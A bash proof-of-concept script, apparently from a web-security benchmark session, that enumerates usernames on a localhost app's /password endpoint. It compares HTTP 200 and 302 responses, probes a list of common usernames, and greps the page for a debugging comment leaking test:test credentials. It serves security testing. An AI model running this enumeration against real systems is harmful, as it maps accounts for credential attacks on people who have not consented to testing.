#!/bin/bash
# POC: Demonstrates user enumeration via HTTP status codes and error messages on /password endpoint
# Target: ./repo
# Created: 2025-11-04T20:09:23.440Z
# Session: benchmark-XBEN-027-24-mhkzunic

# User Enumeration via HTTP Status Codes POC
# This script demonstrates how an attacker can enumerate valid usernames
# by observing HTTP status codes and error messages on the password endpoint

TARGET="http://localhost:8080"
PASSWORD_ENDPOINT="/password"

echo "=== User Enumeration via HTTP Status Codes ==="
echo "Target: $TARGET$PASSWORD_ENDPOINT"
echo ""

# Test 1: Check valid user (test)
echo "[*] Testing with valid username 'test':"
RESPONSE=$(curl -s -i "$TARGET$PASSWORD_ENDPOINT/test" 2>/dev/null)
HTTP_STATUS=$(echo "$RESPONSE" | head -n 1)
echo "HTTP Response: $HTTP_STATUS"
BODY=$(echo "$RESPONSE" | tail -n +1)
if echo "$BODY" | grep -q "Welcome"; then
    echo "✓ Contains 'Welcome' message - User EXISTS"
fi
if echo "$BODY" | grep -q "hidden user_id"; then
    echo "✓ Contains hidden user_id field - Confirms valid user"
fi
echo ""

# Test 2: Check non-existent user
echo "[*] Testing with non-existent username 'nonexistent':"
RESPONSE=$(curl -s -i "$TARGET$PASSWORD_ENDPOINT/nonexistent" 2>/dev/null)
HTTP_STATUS=$(echo "$RESPONSE" | head -n 1)
echo "HTTP Response: $HTTP_STATUS"
if echo "$HTTP_STATUS" | grep -q "302"; then
    echo "✓ Returns HTTP 302 redirect - User DOES NOT EXIST"
fi
BODY=$(echo "$RESPONSE" | tail -n +1)
LOCATION=$(echo "$BODY" | grep -i "Location:" | head -1)
if [ -n "$LOCATION" ]; then
    echo "Location header: $LOCATION"
    if echo "$LOCATION" | grep -q "User+not+found"; then
        echo "✓ Error message reveals 'User not found' - Confirms non-existence"
    fi
fi
echo ""

# Test 3: Check for debugging comments in HTML
echo "[*] Checking for debugging comments in valid user response:"
RESPONSE=$(curl -s "$TARGET$PASSWORD_ENDPOINT/test" 2>/dev/null)
if echo "$RESPONSE" | grep -q "TODO.*test:test"; then
    echo "✓ Found debugging comment with test credentials: test:test"
fi
echo ""

# Test 4: Enumerate multiple usernames
echo "[*] Enumerating common usernames:"
USERNAMES=("admin" "user" "test" "root" "anonymous" "guest" "nonexistent123")
VALID_USERS=()
INVALID_USERS=()

for username in "${USERNAMES[@]}"; do
    RESPONSE=$(curl -s -i "$TARGET$PASSWORD_ENDPOINT/$username" 2>/dev/null)
    HTTP_STATUS=$(echo "$RESPONSE" | head -n 1)
    
    if echo "$HTTP_STATUS" | grep -q "200"; then
        VALID_USERS+=("$username")
        echo "  [+] $username: HTTP 200 (VALID USER)"
    elif echo "$HTTP_STATUS" | grep -q "302"; then
        INVALID_USERS+=("$username")
        echo "  [-] $username: HTTP 302 (Invalid/Not found)"
    else
        echo "  [?] $username: $HTTP_STATUS"
    fi
done

echo ""
echo "=== ENUMERATION SUMMARY ==="
echo "Valid usernames found: ${VALID_USERS[*]}"
echo "Invalid usernames: ${INVALID_USERS[*]}"
echo ""
echo "[!] VULNERABILITY CONFIRMED: HTTP status codes allow user enumeration"